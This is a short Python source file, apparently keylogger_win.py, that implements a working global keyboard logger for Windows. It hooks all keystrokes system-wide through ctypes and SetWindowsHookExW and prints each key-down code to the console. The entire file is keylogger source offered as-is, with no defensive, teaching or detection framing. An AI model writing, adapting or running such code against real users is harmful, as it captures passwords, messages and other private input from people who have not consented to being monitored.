# language: Python 3, file: keylogger_win.py, target: Windows
# Low-level Windows Keylogger via SetWindowsHookExW.
import ctypes
import ctypes.wintypes
import threading
import time

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", ctypes.wintypes.DWORD),
        ("scanCode", ctypes.wintypes.DWORD),
        ("flags", ctypes.wintypes.DWORD),
        ("time", ctypes.wintypes.DWORD),
        ("dwExtraInfo", ctypes.POINTER(ctypes.wintypes.ULONG))
    ]

HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.wintypes.WPARAM, ctypes.POINTER(KBDLLHOOKSTRUCT))

hooked = None

def hook_proc(nCode, wParam, lParam):
    if nCode >= 0 and wParam == WM_KEYDOWN:
        vk_code = lParam.contents.vkCode
        print(f"[KEY] VK Code: {vk_code} ({chr(vk_code) if 32 <= vk_code <= 126 else 'SPECIAL'})")
    return user32.CallNextHookEx(hooked, nCode, wParam, lParam)

def start_keylogger():
    global hooked
    callback = HOOKPROC(hook_proc)
    hooked = user32.SetWindowsHookExW(
        WH_KEYBOARD_LL,
        callback,
        kernel32.GetModuleHandleW(None),
        0
    )
    msg = ctypes.wintypes.MSG()
    user32.GetMessageW(ctypes.byref(msg), None, 0, 0)

if __name__ == "__main__":
    print("[*] Starting Keylogger (Press Ctrl+C in terminal to stop)...")
    t = threading.Thread(target=start_keylogger, daemon=True)
    t.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[+] Stopping keylogger.")
